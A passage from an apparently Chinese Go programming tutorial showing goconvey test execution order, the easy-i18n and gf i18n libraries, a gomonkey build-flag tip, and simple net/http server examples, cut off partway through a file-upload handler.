class="keyword">for</span> &#123;</span><br><span class="line">			n, err := ifce.Read(buf)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Fatal(err)</span><br><span class="line">			&#125;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;Received packet: % x\n&quot;</span>, buf[:n])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	...	<span class="comment">// 构造数据包</span></span><br><span class="line">	<span class="comment">// 发送数据包</span></span><br><span class="line">	fmt.Println(serialBuf.Bytes())</span><br><span class="line">	_, err = ifce.Write(serialBuf.Bytes())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Error sending packet:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	time.Sleep(<span class="number">1000</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-github-com-smartystreets-goconvey-convey-单测辅助工具"><a href="#9-github-com-smartystreets-goconvey-convey-单测辅助工具" class="headerlink" title="9. github.com/smartystreets/goconvey/convey 单测辅助工具"></a>9. <code>github.com/smartystreets/goconvey/convey</code> 单测辅助工具</h2><ul>
<li>按照树的结构执行单测</li>
</ul>
<h3 id="9-1-一般用法"><a href="#9-1-一般用法" class="headerlink" title="9.1. 一般用法"></a>9.1. 一般用法</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestConvey</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	Convey(<span class="string">&quot;测试1加上别的数&quot;</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		Convey(<span class="string">&quot;1+1=2&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			sum := <span class="number">1</span> + <span class="number">1</span></span><br><span class="line">			So(sum, ShouldEqual, <span class="number">2</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">		Convey(<span class="string">&quot;1+2=3&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			sum := <span class="number">1</span> + <span class="number">2</span></span><br><span class="line">			So(sum, ShouldEqual, <span class="number">3</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-convey执行顺序"><a href="#9-2-convey执行顺序" class="headerlink" title="9.2. convey执行顺序"></a>9.2. convey执行顺序</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestConvey</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	Convey(<span class="string">&quot;测试1加上别的数&quot;</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		i := <span class="number">1</span></span><br><span class="line">		fmt.Println()</span><br><span class="line">		fmt.Print(<span class="string">&quot;set i to &quot;</span>, i)</span><br><span class="line">		Convey(<span class="string">&quot;1+1=2&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			i += <span class="number">1</span></span><br><span class="line">			So(i, ShouldEqual, <span class="number">2</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">		Convey(<span class="string">&quot;1+2=3&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			i += <span class="number">2</span></span><br><span class="line">			So(i, ShouldEqual, <span class="number">3</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">		fmt.Println()</span><br><span class="line">		fmt.Println(<span class="string">&quot;test done&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>实际输出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=== RUN   TestConvey</span><br><span class="line"></span><br><span class="line">  测试1加上别的数</span><br><span class="line">set i to 1</span><br><span class="line">    1+1=2 ✔</span><br><span class="line">test done</span><br><span class="line"></span><br><span class="line">set i to 1</span><br><span class="line">    1+2=3 ✔</span><br><span class="line">test done</span><br></pre></td></tr></table></figure>

<ul>
<li>从上述代码可以得出结论，每一个Convey的出现，都是把父节点的函数复制了一份，只执行当前的Convey，兄弟Convey不执行</li>
<li>所以每个父节点有几个子节点，其所在函数都会执行多少遍，每一遍只有一个Convey生效，其他的都是空</li>
<li>上面代码可以理解为</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestConvey</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 测试1加上别的数</span></span><br><span class="line">	<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		i := <span class="number">1</span></span><br><span class="line">		fmt.Println()</span><br><span class="line">		fmt.Print(<span class="string">&quot;set i to &quot;</span>, i)</span><br><span class="line">		<span class="comment">// 1+1=2</span></span><br><span class="line">		<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			i += <span class="number">1</span></span><br><span class="line">			So(i, ShouldEqual, <span class="number">2</span>)</span><br><span class="line">		&#125;()</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 不执行 1+2=3</span></span><br><span class="line"></span><br><span class="line">		fmt.Println()</span><br><span class="line">		fmt.Println(<span class="string">&quot;test done&quot;</span>)</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 测试1加上别的数，第二个convey把父节点整个函数重新执行了一遍</span></span><br><span class="line">	<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		i := <span class="number">1</span></span><br><span class="line">		fmt.Println()</span><br><span class="line">		fmt.Print(<span class="string">&quot;set i to &quot;</span>, i)</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 不执行 1+1=2</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 1+2=3</span></span><br><span class="line">		<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			i += <span class="number">2</span></span><br><span class="line">			So(i, ShouldEqual, <span class="number">3</span>)</span><br><span class="line">		&#125;()</span><br><span class="line">		fmt.Println()</span><br><span class="line">		fmt.Println(<span class="string">&quot;test done&quot;</span>)</span><br><span class="line">	&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试集的实际效果</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestConvey</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	Convey(<span class="string">&quot;测试1加上别的数&quot;</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		tests := []<span class="keyword">struct</span> &#123;</span><br><span class="line">			name <span class="type">string</span></span><br><span class="line">			add  <span class="type">int</span></span><br><span class="line">			want <span class="type">int</span></span><br><span class="line">		&#125;&#123;</span><br><span class="line">			&#123;</span><br><span class="line">				name: <span class="string">&quot;1+1=2&quot;</span>,</span><br><span class="line">				add:  <span class="number">1</span>,</span><br><span class="line">				want: <span class="number">2</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">			&#123;</span><br><span class="line">				name: <span class="string">&quot;1+2=3&quot;</span>,</span><br><span class="line">				add:  <span class="number">2</span>,</span><br><span class="line">				want: <span class="number">3</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">			&#123;</span><br><span class="line">				name: <span class="string">&quot;1+3=4&quot;</span>,</span><br><span class="line">				add:  <span class="number">3</span>,</span><br><span class="line">				want: <span class="number">4</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> i, tt := <span class="keyword">range</span> tests &#123;</span><br><span class="line">			fmt.Println()</span><br><span class="line">			fmt.Print(<span class="string">&quot;in &quot;</span>, i, <span class="string">&quot;, tt &quot;</span>, tt)</span><br><span class="line">			Convey(tt.name, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">				So(<span class="number">1</span>+tt.add, ShouldEqual, tt.want)</span><br><span class="line">			&#125;)</span><br><span class="line">			fmt.Println()</span><br><span class="line">			fmt.Print(<span class="string">&quot;out &quot;</span>, i, <span class="string">&quot;, tt &quot;</span>, tt)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println()</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>输出如下，可以看出，循环在每个测试点都重新跑了一遍</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=== RUN   TestConvey</span><br><span class="line"></span><br><span class="line">  测试1加上别的数</span><br><span class="line">in 0, tt &#123;1+1=2 1 2&#125;</span><br><span class="line">    1+1=2 ✔</span><br><span class="line">out 0, tt &#123;1+1=2 1 2&#125;</span><br><span class="line">in 1, tt &#123;1+2=3 2 3&#125;</span><br><span class="line">out 1, tt &#123;1+2=3 2 3&#125;</span><br><span class="line">in 2, tt &#123;1+3=4 3 4&#125;</span><br><span class="line">out 2, tt &#123;1+3=4 3 4&#125;</span><br><span class="line"></span><br><span class="line">in 0, tt &#123;1+1=2 1 2&#125;</span><br><span class="line">out 0, tt &#123;1+1=2 1 2&#125;</span><br><span class="line">in 1, tt &#123;1+2=3 2 3&#125;</span><br><span class="line">    1+2=3 ✔</span><br><span class="line">out 1, tt &#123;1+2=3 2 3&#125;</span><br><span class="line">in 2, tt &#123;1+3=4 3 4&#125;</span><br><span class="line">out 2, tt &#123;1+3=4 3 4&#125;</span><br><span class="line"></span><br><span class="line">in 0, tt &#123;1+1=2 1 2&#125;</span><br><span class="line">out 0, tt &#123;1+1=2 1 2&#125;</span><br><span class="line">in 1, tt &#123;1+2=3 2 3&#125;</span><br><span class="line">out 1, tt &#123;1+2=3 2 3&#125;</span><br><span class="line">in 2, tt &#123;1+3=4 3 4&#125;</span><br><span class="line">    1+3=4 ✔</span><br><span class="line">out 2, tt &#123;1+3=4 3 4&#125;</span><br></pre></td></tr></table></figure>

<h2 id="10-国际化库"><a href="#10-国际化库" class="headerlink" title="10. 国际化库"></a>10. 国际化库</h2><h3 id="10-1-github-com-mylukin-easy-i18n-i18n-轻量简单的国际化库"><a href="#10-1-github-com-mylukin-easy-i18n-i18n-轻量简单的国际化库" class="headerlink" title="10.1. github.com/mylukin/easy-i18n/i18n 轻量简单的国际化库"></a>10.1. <code>github.com/mylukin/easy-i18n/i18n</code> 轻量简单的国际化库</h3><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1) 准备工作"></a>1) 准备工作</h4><ul>
<li>在根目录建立<code>locals</code>目录，里面只能放json文件</li>
<li>文件名只能是语言名称且只能是<code>golang.org/x/text/language</code>包中可以<code>Make</code>出来的名称</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locales</span><br><span class="line">├── en-US.json</span><br><span class="line">└── zh-CN.json</span><br></pre></td></tr></table></figure>

<ul>
<li>名字限制如下</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;golang.org/x/text/language&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	name := <span class="string">&quot;zh-CN&quot;</span></span><br><span class="line">	tag := language.Make(name)</span><br><span class="line">	<span class="keyword">if</span> tag.String() != name &#123;</span><br><span class="line">		<span class="comment">// 语言包不可用</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;can&#x27;t use language package&quot;</span>, name)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;language package&quot;</span>, name ,<span class="string">&quot;is ok&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以用系统内置的一部分</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(language.SimplifiedChinese.String())  <span class="comment">// zh-Hans</span></span><br><span class="line">	fmt.Println(language.Chinese.String())            <span class="comment">// zh</span></span><br><span class="line">	fmt.Println(language.TraditionalChinese.String()) <span class="comment">// zh-Hant</span></span><br><span class="line">	fmt.Println(language.English.String())            <span class="comment">// en</span></span><br><span class="line">	fmt.Println(language.AmericanEnglish.String())    <span class="comment">// en-US</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>json文件内容如下</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;hello&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello world&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;testFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test %d&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>安装命令<code>easy-i18n</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go install github.com/mylukin/easy-i18n/easyi18n@latest</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令将json生成go文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">easyi18n generate --pkg=catalog ./locales ./catalog/catalog.go</span><br></pre></td></tr></table></figure>

<ul>
<li>然后对应的go文件直接包含即可</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	_ <span class="string">&quot;xtunnel/catalog&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2) 使用"></a>2) 使用</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;test/catalog&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/mylukin/easy-i18n/i18n&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/text/language&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	p := i18n.NewPrinter(<span class="string">&quot;zh-CN&quot;</span>)</span><br><span class="line">	<span class="comment">// 使用内置的则可以使用下面语句，不过zh-CN不能用内置的，内置的是zh-Hans</span></span><br><span class="line">	<span class="comment">// p := i18n.NewPrinter(language.SimplifiedChinese)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 直接打印</span></span><br><span class="line">	p.Printf(<span class="string">&quot;testFormat\r\n&quot;</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="comment">// 翻译成字符串</span></span><br><span class="line">	fmt.Println(p.Sprintf(<span class="string">&quot;hello&quot;</span>), p.Sprintf(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-2-github-com-gogf-gf-i18n-gi18n-强大的gf框架中的语言库"><a href="#10-2-github-com-gogf-gf-i18n-gi18n-强大的gf框架中的语言库" class="headerlink" title="10.2. github.com/gogf/gf/i18n/gi18n 强大的gf框架中的语言库"></a>10.2. <code>github.com/gogf/gf/i18n/gi18n</code> 强大的gf框架中的语言库</h3><h4 id="1-语言文件分离放置"><a href="#1-语言文件分离放置" class="headerlink" title="1) 语言文件分离放置"></a>1) 语言文件分离放置</h4><ul>
<li>在项目根目录新建<code>i18n</code>目录，按照语言名称新建不同的目录，名字没有限制</li>
<li><code>i18n</code>是默认的目录名，也可以自定义，自定义则在<code>gi18n.New()</code>设置到Options中就好</li>
<li>里面可以放很多个文件，根据不同模块命名即可，文件可以是toml、yml、json、xml等</li>
<li>目录结构如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i18n</span><br><span class="line">├── en-US</span><br><span class="line">│   ├── test1.toml</span><br><span class="line">│   └── test2.toml</span><br><span class="line">├── hhhhh</span><br><span class="line">│   ├── test1.toml</span><br><span class="line">│   └── test2.toml</span><br><span class="line">└── zh-CN</span><br><span class="line">    ├── test1.toml</span><br><span class="line">    └── test2.toml</span><br></pre></td></tr></table></figure>

<ul>
<li>toml格式内容如下</li>
</ul>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这个是注释</span></span><br><span class="line"><span class="attr">test1</span> = <span class="string">&quot;测试1&quot;</span></span><br><span class="line"><span class="attr">testFormat</span> = <span class="string">&quot;测试格式 %d&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用如下，需要设置语言到ctx中，然后直接翻译成字符串</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gogf/gf/i18n/gi18n&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	g := gi18n.New()</span><br><span class="line">	<span class="comment">// 语言名称设置到ctx中</span></span><br><span class="line">	ctx := gi18n.WithLanguage(context.TODO(), <span class="string">&quot;hhhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">	fmt.Println(g.T(ctx, <span class="string">&quot;test1&quot;</span>))</span><br><span class="line">	fmt.Println(g.Tf(ctx, <span class="string">&quot;testFormat&quot;</span>, <span class="number">1</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-语言文件打包到二进制"><a href="#2-语言文件打包到二进制" class="headerlink" title="2) 语言文件打包到二进制"></a>2) 语言文件打包到二进制</h4><ul>
<li>使用gf命令将文件打包到go文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接打包保留i18n的目录</span></span><br><span class="line">gf pack -y i18n catalog/catalog.go</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将locales下文件打包到i18n目录（对于二进制来说）</span></span><br><span class="line">gf pack -y locales -p=i18n catalog/catalog.go</span><br></pre></td></tr></table></figure>

<ul>
<li>然后对应的go文件直接包含即可</li>
<li>不过go自己会找当前工程目录下的i18n目录（绝对路径），所以要测试可以重命名此目录进行测试</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;test/catalog&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gogf/gf/i18n/gi18n&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:generate gf pack -y i18n catalog/catalog.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	g := gi18n.New()</span><br><span class="line">	<span class="comment">// 语言名称设置到ctx中</span></span><br><span class="line">	ctx := gi18n.WithLanguage(context.TODO(), <span class="string">&quot;hhhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">	fmt.Println(g.T(ctx, <span class="string">&quot;test1&quot;</span>))</span><br><span class="line">	fmt.Println(g.Tf(ctx, <span class="string">&quot;testFormat&quot;</span>, <span class="number">1</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-github-com-agiledragon-gomonkey-hook函数很好的一个库"><a href="#11-github-com-agiledragon-gomonkey-hook函数很好的一个库" class="headerlink" title="11. github.com/agiledragon/gomonkey hook函数很好的一个库"></a>11. <code>github.com/agiledragon/gomonkey</code> hook函数很好的一个库</h2><h3 id="1-使用"><a href="#1-使用" class="headerlink" title="1) 使用"></a>1) 使用</h3><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><h4 id="1-直接go-test不生效，vscode调试可以"><a href="#1-直接go-test不生效，vscode调试可以" class="headerlink" title="(1) 直接go test不生效，vscode调试可以"></a>(1) 直接<code>go test</code>不生效，vscode调试可以</h4><ul>
<li>原因是直接跑编译器会自动优化代码，而此库不能对代码做优化，所以需要加<code>-gcflags &quot;all=-l&quot;</code></li>
<li>在vscode中点击<code>run test</code>则需要添加下面的配置到<code>settings.json</code>中</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	...</span><br><span class="line">	<span class="attr">&quot;go.testFlags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;-gcflags=all=-l&quot;</span> <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="七、实战"><a href="#七、实战" class="headerlink" title="七、实战"></a>七、实战</h1><h2 id="1-搭建简单http服务器"><a href="#1-搭建简单http服务器" class="headerlink" title="1. 搭建简单http服务器"></a>1. 搭建简单http服务器</h2><h3 id="1-1-模板"><a href="#1-1-模板" class="headerlink" title="1.1. 模板"></a>1.1. 模板</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> retJson <span class="keyword">struct</span> &#123;</span><br><span class="line">	Code  <span class="type">int</span>    <span class="string">`json:&quot;code&quot;`</span></span><br><span class="line">	LLLL  <span class="type">string</span> <span class="string">`json:&quot;llll&quot;`</span></span><br><span class="line">	AAAA  <span class="type">string</span> <span class="string">`json:&quot;aaaa&quot;`</span></span><br><span class="line">	Token <span class="type">string</span> <span class="string">`json:&quot;token&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">smsServerHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	r.ParseForm()</span><br><span class="line">	fmt.Println(r.Form)</span><br><span class="line">	fmt.Println(<span class="string">&quot;path&quot;</span>, r.URL.Path)</span><br><span class="line">	fmt.Println(<span class="string">&quot;scheme&quot;</span>, r.URL.Scheme)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> ret retJson</span><br><span class="line">	ret.Code = <span class="number">0</span></span><br><span class="line">	ret.LLLL = <span class="string">&quot;test&quot;</span></span><br><span class="line">	ret.AAAA = <span class="string">&quot;stest&quot;</span></span><br><span class="line">	ret.Token = <span class="string">&quot;a454as1bbvd5g5s15155&quot;</span></span><br><span class="line">	retBytes, _ := json.MarshalIndent(&amp;ret, <span class="string">&quot;&quot;</span>, <span class="string">&quot;    &quot;</span>)</span><br><span class="line">	retStr := <span class="type">string</span>(retBytes)</span><br><span class="line">	fmt.Println(retStr)</span><br><span class="line"></span><br><span class="line">	w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application-json&quot;</span>)</span><br><span class="line">	fmt.Fprintf(w, retStr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 接口处理到函数</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, smsServerHandler)</span><br><span class="line">	<span class="comment">// 接口处理到目录，主要用于静态页面返回</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;template&quot;</span>)))</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:7878&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;ListenAndServe failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-静态页面路径返回"><a href="#1-2-静态页面路径返回" class="headerlink" title="1.2. 静态页面路径返回"></a>1.2. 静态页面路径返回</h3><p><strong>最简单跟目录返回</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 接口处理到目录，主要用于静态页面返回</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;template&quot;</span>)))</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:7878&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;ListenAndServe failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>其他路径返回页面</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 访问根转发到template</span></span><br><span class="line">	<span class="keyword">if</span> r.URL.Path == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">		http.Redirect(w, r, <span class="string">&quot;/template/&quot;</span>, http.StatusFound)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	w.Write([]<span class="type">byte</span>(r.URL.Path))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 返回界面，将 /template/ 裁掉访问目录</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/template/&quot;</span>, http.StripPrefix(<span class="string">&quot;/template/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;./template&quot;</span>))))</span><br><span class="line">	<span class="comment">// 处理其他请求</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, rootHandler)</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;start server: http://localhost:4567 &quot;</span>)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:4567&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;Listen port failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-上传文件"><a href="#1-3-上传文件" class="headerlink" title="1.3. 上传文件"></a>1.3. 上传文件</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">uploadHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 获取表单的file字段</span></span><br><span class="line">	file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> 